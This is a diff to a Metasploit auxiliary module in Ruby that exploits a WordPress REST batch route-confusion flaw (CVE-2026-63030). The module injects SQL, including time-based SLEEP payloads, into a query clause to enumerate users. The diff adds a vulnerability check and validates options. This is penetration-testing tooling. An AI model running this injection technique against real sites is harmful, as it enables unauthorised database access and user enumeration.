@@ -66,12 +66,13 @@ class MetasploitModule < Msf::Auxiliary
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'SideEffects' => [IOC_IN_LOGS],
-          'Reliability' => []
+          'Reliability' => [],
+          'RelatedModules' => ['exploit/multi/http/wp_batch_desync_rce']
         }
       )
     )
     register_options([
-      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3])
+      OptInt.new('COUNT', [true, 'Number of users to enumerate', 3])
     ])
   end
 
@@ -107,7 +108,7 @@ class MetasploitModule < Msf::Auxiliary
   # Build and send the double-nested route-confusion payload that lands +payload+ in the
   # author__not_in SQL clause. Used as the injection transport for the SQLi engine.
   def inject(payload)
-    num = Rex::Text.rand_text_numeric(4, 0)
+    num = rand(1000..9999).to_s
     ali = Rex::Text.rand_text_alpha(4)
     # Break out of post_author NOT IN (<value>); wrap the engine payload in an uncorrelated derived
     # table so a time-based SLEEP fires once, not once per matched row; comment out the remainder.
@@ -130,9 +131,26 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::Unreachable, "#{peer} - Connection failed") unless res
   end
 
-  def run_host(_ip)
+  def check_host(_ip)
+    unless wordpress_and_online?
+      return Msf::Exploit::CheckCode::Safe('Server is not online or was not detected as WordPress')
+    end
+
     unless route_confusion?
-      print_error("#{peer} - REST batch route-confusion markers absent; target is patched or not affected")
+      return Msf::Exploit::CheckCode::Safe('REST batch route-confusion markers are absent; target is patched or not affected')
+    end
+
+    Msf::Exploit::CheckCode::Vulnerable('REST batch route confusion detected (CVE-2026-63030)')
+  end
+
+  def run_host(ip)
+    if datastore['COUNT'].negative?
+      fail_with(Failure::BadConfig, 'COUNT must be zero or greater')
+    end
+
+    check_code = check_host(ip)
+    unless check_code == Msf::Exploit::CheckCode::Vulnerable
+      print_error("#{peer} - #{check_code.message}")
       return
     end
     print_good("#{peer} - REST batch route-confusion detected (CVE-2026-63030)")
